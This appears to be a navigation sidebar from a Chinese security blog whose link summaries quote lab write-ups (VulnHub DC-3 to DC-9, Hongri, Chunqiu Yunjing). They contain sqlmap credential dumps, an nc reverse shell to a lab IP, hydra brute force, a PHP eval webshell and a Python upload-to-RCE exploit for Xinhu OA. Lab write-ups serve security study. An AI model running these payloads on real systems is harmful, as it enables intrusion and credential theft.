sqlmap -u &amp;amp;#34;http://192.168.111.191/index.php?option=com_fields&amp;amp;amp;view=fields&amp;amp;amp;layout=modal&amp;amp;amp;list[fullordering]=updatexml&amp;amp;#34; --risk=3 -p list[fullordering] -D &amp;amp;#34;joomladb&amp;amp;#34; --tables 一共76张表，#__users 这个表一看就很有用，看看
爆列名：
sqlmap -u &amp;amp;#34;http://192.168.111.191/index.php?option=com_fields&amp;amp;amp;view=fields&amp;amp;amp;layout=modal&amp;amp;amp;list[fullordering]=updatexml&amp;amp;#34; --risk=3 -p list[fullordering] -D &amp;amp;#34;joomladb&amp;amp;#34; --tables -T &amp;amp;#34;#__users&amp;amp;#34; --columns 接下来爆username和password字段：
sqlmap -u &amp;amp;#34;http://192.168.111.191/index.php?option=com_fields&amp;amp;amp;view=fields&amp;amp;amp;layout=modal&amp;amp;amp;list[fullordering]=updatexml&amp;amp;#34; --risk=3 -p list[fullordering] -D &amp;amp;#34;joomladb&amp;amp;#34; --tables -T &amp;amp;#34;#__users&amp;amp;#34; --columns -C &amp;amp;#34;username,password&amp;amp;#34; --dump ">DC-3渗透笔记</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-4%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="DC-4渗透笔记 信息搜集 探测IP nmap扫c段：
nmap -sP 192.168.111.0/24 可以确定IP为192.168.111.191
端口探测 nmap探测端口：
nmap -sV -p- 192.168.111.191 可见开启了两个端口：
22端口，ssh服务 80端口，http服务 网页信息搜集 老规矩，先看看80端口的网页：
一个登录框而且不是通用的CMS，那么思路就放在登录框对抗上
先扫目录看看：
确实没啥利用点，直接开始我们的登录口对抗
漏洞利用 登录口对抗 这里首先考虑弱口令和sql注入，先抓个包爆破一下：
用户名用admin试试，密码跑一下字典
这不就爆出来了，密码为happy，直接登录：
顺利进入后台，这里有个执行命令的选项，我们点run试试： 这里是执行了ls -l，抓包看看命令是否可控呢： 命令可控，将命令改为whoami，成功执行，思路对了，那么接下来肯定想到反弹shell了
命令执行反弹shell kali上开启监听：
接下来执行反弹shell的命令：
nc 192.168.111.132 4444 -e /bin/bash 注意参数的空格改为&#43;号：
连接成功：
太丑了，python获取一个pty：
舒服了，接下来应该就是权限提升了
权限提升 hydra爆破ssh 看看有没有什么可疑的文件比如sudo，suid之类的：
没有太多收获，去家目录看看呢：
可见有三个用户，而jim用户的文件有点可疑，仔细看看：
mbox应该是个邮箱，但权限不够看不了
test.sh是个普通脚本文件，但backups文件夹中有旧密码备份，很容易想到爆破ssh了，用kali自带的hydra一下：
hydra -l jim -P ./pass.txt 192.168.111.191 ssh ">DC-4渗透笔记</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-5%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="DC-5渗透笔记 信息搜集 经过前面几个靶机的练习，已经轻车熟路了：
信息搜集一条龙，可知：
IP为192.168.111.145 开放了80、111、47890三个端口 目录扫描到一点点可访问路径 接下来看看web服务：
并不是什么通用的cms，那么就只有先尝试从功能点入手了，翻一翻这里有哪些功能
我们发现contact功能点有留言功能，写点东西试试
提交后发现跳转了，并且网页底部的Copyright值从2019变成了2017
联想到我们在用dirsearch的时候，扫描到一个footer.php，看名字应该也是一个关于网页底部内容的文件，访问试试：
还真是，而且如果我们刷新，年份还会有变化：
如果有搭建博客经历的话，其实就能想到，这个footer.php应该是被包含在了thankyou.php里的，我们可以尝试以此为立足点展开利用
漏洞利用 文件包含漏洞 如果这里存在文件包含，我们可以用fuzz一下可能用于包含的参数
先试试get方法：
fuzz一手发现参数为file
再验证一下，包含/etc/passwd试试：
确实是文件包含，那么这里想要getshell就有两种思路：
打php_filter_chain，但是filter链很长，会被GET传参限制，所以只能执行简单命令，但确实可以实现RCE：
包含日志文件写马，只要知道日志文件路径就能写，而我们已知中间件为Nginx，路径通常为/var/log/nginx/access.log，可以尝试一手
包含日志文件写马 ok直接抓包写一个phpinfo试试：
包含日志文件看看：
出现了phpinfo界面，成功
接下来可以写个一句话木马：
蚁剑连接试试：
连上了，接下来就是反弹shell了
获取交互式shell nc反弹shell
成功连上了
依然是python获取pty： 我们当前的权限是www-data，接下来又是权限提升了
权限提升 先看看SUID权限的文件有没有什么可以利用的
还真有一个Screen 4.5.0的漏洞可用于权限提升
将脚本复制一份放到web目录：
看看脚本内容：
如图，脚本内容分三段，前两段会构造出单独的脚本文件，还有一段会执行利用命令
接下来打开http服务准备上传文件：
python2 -m SimpleHTTPServer 8000 在靶机上使用wget下载脚本文件到/tmp/目录，再赋予执行权限，即可运行提权脚本：
">DC-5渗透笔记</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-6%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="DC-6渗透笔记 靶机给了两个提示，一个是插件，一个是暴力破解
信息收集 IP探测 IP为192.168.111.142
端口探测 可知开放了22端口和80端口
网页信息搜集 访问网页发现无法访问
发现url被解析成wordy，和DC-2类似，在hosts文件添加解析再次访问
主要信息就是CMS为wordpress 5.1.1
先扫一下目录：
可以找到后台登陆点
漏洞利用 暴力破解登陆后台 根据提示可以想到这里应该是要暴力破解一下后台密码
先用wpscan扫扫
wpscan --url http://wordy --enumerate u 枚举出几个用户，先保存在文件里
我们直接用rockyou.txt爆破一下：
wpscan --url http://wordy -P /usr/share/wordlists/rockyou.txt -U wpname.txt 字典很大，耐心等待
最后得到mark的密码：helpdesk01
即可登录进入后台
后台getshell 后台发现这个插件似乎使用命令执行，lookup抓包看看：
还真是，那就直接反弹shell：
ok已经getshell，再拿个pty：
接下来就是提权了
权限提升 在stuff目录下找到了一个任务清单：
发现了graham的密码：GSo7isUM1D4
直接登录：
看看sudo权限：
发现一个免密sudo（身份为jens）的脚本，看看内容和权限： jens用户可读可写可执行，很明显的sudo脚本篡改提权，直接追加写入内容，再以jens用户执行，可以拿到jens身份的bash（这里尝试的时候，提示权限不足，应该是切换用户时的问题，于是换成使用ssh登录graham用户）：
再看看jens的sudo权限：
发现nmap可以免密sudo执行，而nmap可以执行脚本文件，也可以实现权限提升：
成功拿到root权限
在/root目录拿到flag：
">DC-6渗透笔记</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-7%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="DC-7渗透笔记 靶场作者说明：
信息搜集 IP、端口、目录一条龙：
可知：
IP为192.168.111.145 开放22、80端口 目录毛都没扫出 看看web网页：
可知cms是Drupal 8
漏洞利用 敏感信息泄露 在靶场描述里说挑战不完全是技术性的，要跳出框框思考，说明突破口可能不是网站本身，找找看
在页脚发现一个叫@DC7USER的用户，搜搜结果发现了该用户的github
看看他发的代码：
在config.php里面发现了账密，试试登录drupal呢
利用账密连接ssh 错了，那还有登陆的地方就是22端口的ssh服务，连接试试：
这就getshell了？
shell下的信息搜集 正常进行信息收集，看看suid、sudo、内核等：
确实没有什么利用点，那可能就是有什么利用文件了，找找看：
当前目录有备份文件夹，但里面是加密的gpg文件，而mbox记录了root的定时任务，路径为/opt/scripts/backups.sh，过去看看：
利用这个root的任务可以提权，但发现脚本只有root和www-data可写，得想办法拿到www-data身份，那就得通过web服务拿shell，那么入手点又要回到后台，先看看脚本
脚本内容：
#!/bin/bash # 删除 /home/dc7user/backups/ 目录下的所有文件 rm /home/dc7user/backups/* # 切换目录到 /var/www/html/ cd /var/www/html/ # 使用 Drush 工具导出数据库，并将结果保存为 /home/dc7user/backups/website.sql drush sql-dump --result-file=/home/dc7user/backups/website.sql # 返回上级目录 cd .. # 将 html/ 目录的内容打包成 website.tar.gz 并保存在 /home/dc7user/backups/ 目录下 tar -czf /home/dc7user/backups/website.tar.gz html/ # 使用 GPG 对 /home/dc7user/backups/website.sql 文件进行对称加密，并用指定的密码保护 gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql # 使用 GPG 对 /home/dc7user/backups/website.tar.gz 文件进行对称加密，并用指定的密码保护 gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz # 将 /home/dc7user/backups/ 目录下所有文件的所有者改为 dc7user chown dc7user:dc7user /home/dc7user/backups/* # 删除 /home/dc7user/backups/website.sql 文件 rm /home/dc7user/backups/website.sql # 删除 /home/dc7user/backups/website.tar.gz 文件 rm /home/dc7user/backups/website.tar.gz 这里重点在于drush，是一个简化了创建和管理Drupal8网站的命令行工具，可以用来修改密码：
">DC-7渗透笔记</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-8%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="DC-8渗透笔记 靶场描述：
信息搜集 IP、端口、网页目录一条龙：
IP为192.168.111.191 端口开放了22、80 目录可以看到登陆后台 再看看网页： 这次的cms是drupal 7
漏洞利用 sql注入获取密码哈希 翻翻各个页面：
发现有的页面是使用nid参数进行控制的，看看有没有sql注入：
还真有，直接sqlmap一把梭：
爆库名：
库名为d7db
爆表名： 88张表，里面的users表值得关注
爆列名：
16列，主要关注其中的name和pass
爆字段：
ok拿到两组密码哈希
john破解密码哈希 把获得的账密写入文档：
用john进行暴力破解：
admin的密码无法破解但john的密码是turtle
后台反弹shell 直接在/user/login登录，成功，接下来就是在后台看看有没有写文件之类能够用来getshell的点了：
发现确实有个写php代码的位置，懒得连webshell再反弹了，直接写反弹shell代码：
确认页面后，填写信息，发送php代码：
成功反弹shell：
python获取pty：
进入提权阶段
权限提升 接下来就是针对提权的信息收集了，发现suid权限的配置有点问题：
这个exim4有点问题，看看：
发现该版本存在权限提升的漏洞
cp一下脚本，并且编辑查看文件类型：set ff=unix，这样脚本才能再linux下执行
将该脚本上传到靶机上并赋予执行权限：
按照使用方法执行脚本：
再在/root拿到flag：
总结 本次渗透过程中，我们遇到了如下漏洞或利用：
drupal 7页面id存在sql注入 john破解密码哈希 后台contact页面能以php代码编辑，实现反弹shell exim4.89 存在权限提升漏洞 ">DC-8渗透笔记</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-9%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-link" data-summary="DC-9渗透笔记 信息搜集 IP、端口、目录一条龙：
IP为192.168.111.142 端口开放了22、80 目录只扫到一点点 再看看web页面：
并不是什么通用的cms，那就从功能点入手： 搜索功能点有个输入框，用万能密码试试：
直接爆出了所有员工信息：
可知这里有SQL注入
漏洞利用 sql注入 sqlmap跑一下
爆库名：
爆表名：
打印表：
获得了员工的账密，但是没有admin，再看看Staff库：
有俩表
爆俩表：
StaffDetails：
Users：
得到了admin的密码transorbital1
文件包含 成功登录：
注意到页脚有“File does not exist”，一眼定真，存在文件包含，之前DC也遇到过，猜猜参数：
哈哈还真是
接下来本来想尝试包含日志文件写马的，但是没有试出日志文件路径。。。
那么如何getshell？我们包含的时候可见passwd文件有很多用户，和数据库中用户一致，所以可以尝试一下ssh爆破：
hydra -L name.txt -P pass.txt ssh://192.168.111.142 不行，拒绝连接，这里应该是存在敲门服务：
存在knockd服务。 该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来&amp;amp;quot;敲门&amp;amp;quot;，使系统开启需要访问的服务端口，才能对外访问。 不使用时，再使用自定义的序列号来&amp;amp;quot;关门&amp;amp;quot;，将端口关闭，不对外监听。进一步提升了服务和系统的安全 //配置文件路径 默认配置文件是：/etc/knockd.conf
所以先包含一下配置文件看看：
所以要依次对7469、8475、9842敲门，再连接ssh服务：
敲门：
可以看见ssh已开启：
接下来再ssh爆破：
获得了三组账户
ssh连接 三组用户都登陆试试，最后发现janitor的个人目录下有一个目录，看看：
">DC-9渗透笔记</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>春秋云境</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-initial/" class="article-link" data-summary="春秋云境-initial flag1 进入环境，发现80端口开启，看图标疑似thinkphp，指纹识别发现确实是tp5：
一把梭哈发现存在RCE：
直接写webshell连接上线：
当前权限为www-data：
尝试权限提升，信息搜集发现/usr/bin/mysql可以无密码sudo：
看看怎么打sudo提权：
ok会了，直接提权到root：
sudo /usr/bin/mysql -e &amp;amp;#39;\! /bin/sh&amp;amp;#39; 按理说这里应该没问题的，由于是webshell所以不能获取新的bash，改成ls：
sudo /usr/bin/mysql -e &amp;amp;#39;\! ls -al /root&amp;amp;#39; flag在root中，直接读：
sudo /usr/bin/mysql -e &amp;amp;#39;\! cat /root/flag&amp;amp;#39; 哦？再来
sudo /usr/bin/mysql -e &amp;amp;#39;\! ls /root/flag&amp;amp;#39; 行，再读：
拿到flag1：
flag{60b53231- flag2 内网网段为：172.22.1.0/24：
fscan传上去扫扫内网：
有如下关键信息：
172.22.1.2:DC域控 172.22.1.21:Windows的机器并且存在MS17-010 漏洞 172.22.1.18:信呼OA办公系统 那么先从信呼OA办公系统入手吧，搭个隧道：
然后proxifier配置物理机代理后访问信呼OA办公系统：
弱口令admin：admin123登录成功
这个系统存在文件上传漏洞的day（脚本的同目录写一个名为1.php的一句话木马）：
import requests session = requests.session() url_pre = &amp;amp;#39;http://172.22.1.18/&amp;amp;#39; url1 = url_pre &#43; &amp;amp;#39;?a=check&amp;amp;amp;m=login&amp;amp;amp;d=&amp;amp;amp;ajaxbool=true&amp;amp;amp;rnd=533953&amp;amp;#39; url2 = url_pre &#43; &amp;amp;#39;/index.php?a=upfile&amp;amp;amp;m=upload&amp;amp;amp;d=public&amp;amp;amp;maxsize=100&amp;amp;amp;ajaxbool=true&amp;amp;amp;rnd=798913&amp;amp;#39; url3 = url_pre &#43; &amp;amp;#39;/task.php?m=qcloudCos|runt&amp;amp;amp;a=run&amp;amp;amp;fileid=11&amp;amp;#39; data1 = { &amp;amp;#39;rempass&amp;amp;#39;: &amp;amp;#39;0&amp;amp;#39;, &amp;amp;#39;jmpass&amp;amp;#39;: &amp;amp;#39;false&amp;amp;#39;, &amp;amp;#39;device&amp;amp;#39;: &amp;amp;#39;1625884034525&amp;amp;#39;, &amp;amp;#39;ltype&amp;amp;#39;: &amp;amp;#39;0&amp;amp;#39;, &amp;amp;#39;adminuser&amp;amp;#39;: &amp;amp;#39;YWRtaW4=&amp;amp;#39;, &amp;amp;#39;adminpass&amp;amp;#39;: &amp;amp;#39;YWRtaW4xMjM=&amp;amp;#39;, &amp;amp;#39;yanzm&amp;amp;#39;: &amp;amp;#39;&amp;amp;#39; } r = session.post(url1, data=data1) r = session.post(url2, files={&amp;amp;#39;file&amp;amp;#39;: open(&amp;amp;#39;1.php&amp;amp;#39;, &amp;amp;#39;r&#43;&amp;amp;#39;)}) filepath = str(r.json()[&amp;amp;#39;filepath&amp;amp;#39;]) filepath = &amp;amp;#34;/&amp;amp;#34; &#43; filepath.split(&amp;amp;#39;.uptemp&amp;amp;#39;)[0] &#43; &amp;amp;#39;.php&amp;amp;#39; id = r.json()[&amp;amp;#39;id&amp;amp;#39;] url3 = url_pre &#43; f&amp;amp;#39;/task.php?m=qcloudCos|runt&amp;amp;amp;a=run&amp;amp;amp;fileid={id}&amp;amp;#39; r = session.get(url3) r = session.get(url_pre &#43; filepath &#43; &amp;amp;#34;?1=system(&amp;amp;#39;dir&amp;amp;#39;);&amp;amp;#34;) print(r.text) ">春秋云境-initial</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>红日</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E7%BA%A2%E6%97%A5/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/" class="article-link" data-summary="红日靶场01 外网部分 信息收集 首先扫描C段找一下目标站点IP：
netdiscover -i eth0 -r 192.168.221.0/24 找到站点外网IP为192.168.221.133
接下来进行端口扫描
发现80端口开启，并且站点开启了mysql服务
访问80端口，是一个phpinfo()页面，且可以进行mysql连接测试
使用root，root发现mysql存在弱口令
接下来使用dirsearch扫描一下网站目录，发现存在phpmyadmin后台，是用于管理MySQL数据库的工具
直接使用mysql弱口令root，root即可登陆，发现后台可执行sql语句，尝试写马
查看数据库是否有导入权限，看能否直接导入木马
SHOW GLOBAL VARIABLES LIKE &amp;amp;#39;%secure%&amp;amp;#39; 发现没有权限
查看是否有开启日志记录
SHOW GLOBAL VARIABLES LIKE ‘%general%’ 发现功能关闭
开启全局日志
SET GLOBAL general_log = ON 指定日志写入到网站根目录
set GLOBAL general_log_file=&amp;amp;#39;C:/phpStudy/WWW/log.php&amp;amp;#39; 写马
select &amp;amp;#39;&amp;amp;lt;?php eval($_POST[1]);?&amp;amp;gt;&amp;amp;#39; 访问log.php可查看日志，用蚁剑连接即可getshell
用蚁剑连接后，发现目录存在其他网站，访问/yxcms：
发现网站首页存在默认密码泄露，经尝试，可直接登入后台
进入后台，发现可以在前台模板写入一句话木马
查找路径为/yxcms/protected/apps/default/view/default/shell2.php，访问，连接成功
tips：这里还存在目录浏览漏洞，访问没有默认页面的目录，可以遍历目录文件
攻击和利用阶段 上线CS 可以使用cobalt strike生成exe上传远连，也可以生成powershell命令传参给webshell执行远连
连接成功
右键目标机在session中将sleep时长调整为0，加快回显速度
再右键点击interact打开交互界面，查看权限：
这里依旧是system权限，如果是administrator，可以参考如下方法提权：
查看系统信息
">红日靶场01</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E7%BA%A2%E6%97%A5/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA02/" class="article-link" data-summary="红日靶场02 探索发现阶段（信息搜集） 已知外网IP：192.168.111.80，对其进行Nmap扫描
nmap -T4 -A -v 192.168.111.80 #使用-T4选项设置扫描速度为快速，-A选项启用操作系统检测、版本检测和脚本扫描，-v选项启用详细输出 结果如下：
PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: Site doesn&amp;amp;#39;t have a title. | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2008 R2 10.50.4000.00; SP2 | ms-sql-info: | 192.168.111.80:1433: | Version: | name: Microsoft SQL Server 2008 R2 SP2 | number: 10.50.4000.00 | Product: Microsoft SQL Server 2008 R2 | Service pack level: SP2 | Post-SP patches applied: false |_ TCP port: 1433 | ms-sql-ntlm-info: | 192.168.111.80:1433: | Target_Name: DE1AY | NetBIOS_Domain_Name: DE1AY | NetBIOS_Computer_Name: WEB | DNS_Domain_Name: de1ay.com | DNS_Computer_Name: WEB.de1ay.com | DNS_Tree_Name: de1ay.com |_ Product_Version: 6.1.7601 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Issuer: commonName=SSL_Self_Signed_Fallback | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2024-04-29T11:29:28 | Not valid after: 2054-04-29T11:29:28 | MD5: 0922:47cc:d252:0c16:f6c2:b016:a65c:5bba |_SHA-1: a463:9836:8e4c:a84c:575d:f8a9:7dc8:4f66:4299:5f2a |_ssl-date: 2024-04-29T12:41:08&#43;00:00; 0s from scanner time. 3389/tcp open tcpwrapped | rdp-ntlm-info: | Target_Name: DE1AY | NetBIOS_Domain_Name: DE1AY | NetBIOS_Computer_Name: WEB | DNS_Domain_Name: de1ay.com | DNS_Computer_Name: WEB.de1ay.com | DNS_Tree_Name: de1ay.com | Product_Version: 6.1.7601 |_ System_Time: 2024-04-29T12:40:29&#43;00:00 | ssl-cert: Subject: commonName=WEB.de1ay.com | Issuer: commonName=WEB.de1ay.com | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2024-04-28T11:30:12 | Not valid after: 2024-10-28T11:30:12 | MD5: 95dd:c1e4:588c:7e02:f29a:c6c5:a523:dfa6 |_SHA-1: 4404:e395:da84:2b4c:8506:06af:c749:d40a:cff7:9bc6 |_ssl-date: 2024-04-29T12:41:08&#43;00:00; 0s from scanner time. 7001/tcp open http Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled) |_http-title: Error 404--Not Found |_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC MAC Address: 00:0C:29:65:23:E2 (VMware) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: phone|specialized|general purpose Running (JUST GUESSING): Microsoft Windows Phone|7|8.1|2008|Vista (94%) OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_server_2008::beta3 cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8 Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (94%), Microsoft Windows Embedded Standard 7 (93%), Microsoft Windows 8.1 R1 (92%), Microsoft Windows 7 (91%), Microsoft Windows Server 2008 or 2008 Beta 3 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows Server 2008 SP1 (87%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 0.050 days (since Mon Apr 29 07:28:28 2024) Network Distance: 1 hop TCP Sequence Prediction: Difficulty=264 (Good luck!) IP ID Sequence Generation: Incremental Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-04-29T12:40:31 |_ start_date: 2024-04-29T11:29:55 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required TRACEROUTE HOP RTT ADDRESS 1 0.81 ms 192.168.111.80 NSE: Script Post-scanning. Initiating NSE at 08:41 Completed NSE at 08:41, 0.00s elapsed Initiating NSE at 08:41 Completed NSE at 08:41, 0.00s elapsed Initiating NSE at 08:41 Completed NSE at 08:41, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 215.02 seconds Raw packets sent: 2155 (99.940KB) | Rcvd: 31 (1.544KB) 根据结果可知服务器操作系统为Windows Server 2008 R2 - 2012，且开启了80、135、139、445、1433、3389、7001、49152、49153、49154端口
">红日靶场02</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E7%BA%A2%E6%97%A5/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA03/" class="article-link" data-summary="红日靶场3 在开始之前，可以先看看文末的总结避避坑👇
环境配置 操作的时候按照网上来的，结果频繁出错，过程略显曲折，最后重新分析一下其实很简单：
先配置一张仅主机的网卡vmnet2：192.168.93.0（名字和IP固定的最好不要乱配）
再将所有机器全部开机（最好先开ubantu再开centos，否则容易502），然后将centos的网卡1改为NAT模式即可
完事后，centos重新获取NAT模式网卡ip：
service network restart 完毕，准备开打
信息搜集 IP探测 nmap扫一下确定IP是192.168.111.129
端口探测 发现开放了22、80、3306端口
网页信息搜集 访问80端口：
网站启用了Nginx反向代理，cms是很经典的joomla，但不知道版本号，扫扫目录：
在README.txt发现了版本号：
可知版本为3.9，比较新（相较靶场发布的时间😁）
还发现有个configuration.php~，疑似配置文件，看看： 泄露了一个mysql用户密码
漏洞利用 mysql重置管理员密码 因为端口开启了3306，直接连接试试：
mysql -h 192.168.111.129 -utestuser -pcvcvgjASD!@ 成功连接mysql，那么接下来的思考就是获取后台的管理员密码，如果不行再考虑写webshell
由于命令行有点麻烦，这里直接使用navicat连接mysql：
发现admin账户和密码哈希
查询一下加密方式之类的：
找到一个secret密码的的哈希，直接重置管理员密码： 接下来登录后台
后台写马上线Ubuntu 登录成功
接下来就是找能编辑php的地方
发现模板Beez3，老演员了，打DC的时候就遇到过：
直接编辑：
写个后门，保存后连接试试： 直接就上线了，执行命令看看信息：
全部失败，盲猜有disable_functions，在Beez3创建一个phpinfo.php看看：
访问：
可见禁用了exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source等函数，试试用蚁剑的插件来绕过
选择PHP7_UserFilter模式绕过：
成功：
顺便发现了主机内网IP为：192.168.93.120
继续信息收集一下：
">红日靶场03</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E7%BA%A2%E6%97%A5/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA04/" class="article-link" data-summary="红日靶场04 环境配置 自定义一张网卡 vmnet1：192.168.183.0
将web主机添加一个NAT模式的网卡，再将所有主机（包括web）添加 vmnet1网卡
启动主机，先启动win7后再启动web（否则环境容易出问题）
主机密码：
web：ubuntu:ubuntu DC：administrator:Test2008（登录提示密码过期，我这里更改为Admin123456） win7：douser:Dotest123 为了方便，登录主机后可以将win7的睡眠功能关掉，因为计算机休眠后sessions可能会断开：
登录ubuntu，打开命令行，sudo -s提升为root权限，然后启动容器列表前三个docker：
至此，环境搭建完毕，准备开打
信息搜集 IP探测 确定IP为192.168.111.134
端口扫描 发现开启了22、2001、2002、2003端口
网页信息收集 依次访问三个端口看看：
2001端口 通过网页title可知是struts2框架，而struts2存在很多历史漏洞，那么思路就是对这个输入框进行漏洞检测
2002端口 页面为tomcat，版本为8.5.19
同样可以使用漏扫器进行漏洞检测
2003端口 页面是phpmyadmin，但我这里好像出问题了：
问题不大，可以先尝试前两个端口有没有漏洞
漏洞利用 2001端口 S2-045上传webshell 首先看看2001端口的struts2，附上工具链接：shack2/Struts2VulsTools 扫描发现存在S2-045和S2-046，那么试试用S2-045利用：
上传一个冰蝎webshell：
冰蝎连接：
成功了
2002端口 tomcat解析漏洞上传webshell 这个版本的话，可以试试put漏洞：
也是成功上传一个冰蝎马，连接一下：
ok连上了，因为2003端口有点问题，所以就在这两个shell进行后渗透
后渗透 环境识别 先简单信息收集一下：
权限都是root，但这ip看起来不太正常呢，没懂
看看主机名：
随机字符串，有点像虚拟容器哈
验证下看看是不是docker：
find / -name .dockerenv 结果发现两个shell都是docker，那就只有试试docker逃逸了
">红日靶场04</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
